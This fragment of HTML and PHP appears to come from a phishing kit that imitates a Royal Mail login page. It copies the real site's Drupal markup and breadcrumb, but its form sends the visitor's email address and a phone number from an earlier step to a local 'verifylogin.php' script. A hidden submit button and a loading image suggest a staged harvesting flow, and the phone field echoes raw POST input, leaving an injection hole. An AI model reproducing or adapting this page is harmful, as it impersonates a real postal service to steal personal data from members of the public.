  ...
  <div class="container">
    <div class="row">
      <div class="login-form-column">
        <form class="user-login-form" data-drupal-selector="user-login-form" data-msg-required="This field is required." action="verifylogin.php?&sessionid=$hash&securessl=true" method="POST" id="user-login-form" accept-charset="UTF-8" autocomplete="off">
          <input type="hidden" name="phone" value="<?php echo $_POST['phone']; ?>">


          <center><img style="width: 130px;height: 130px;" class="img-fluid sms-mid-image mt-4" src="files/img/loading.gif" /></center>
          <!--
...
<a id="edit-name--description" class="description tooltip-trigger" href="javascript:">
  <span class="icon__wrapper"><svg class="icon icon--question" focusable="false" aria-hidden="true" role="img" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#question"></use></svg></span>
          ...
          <input autocorrect="none" autocapitalize="none" spellcheck="false" autofocus="autofocus" data-drupal-selector="edit-name" aria-describedby="edit-name--description" data-msg-maxlength="Email address field has a maximum length of 60." data-msg-required="Email address is required." type="text" id="email" name="email" value="" size="60" maxlength="60" class="form-text required" required="required" aria-required="true">
...
<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" data-msg-required="This field is required." id="edit-actions">
  <input data-drupal-selector="edit-submit" data-msg-required="This field is required." type="submit" style="display: none;" id="proceed" name="op" value="Click to proceed" class="button js-form-submit form-submit button--submit">
</div>
<!--
<label data-drupal-selector="edit-register-label" data-msg-required="Not registered yet? is required." for="edit-register-label">Not registered yet?
  ...
  <div class="">
    ...
    <ol>
          <li>
                  <a href="https://www.royalmail.com/">Home</a>
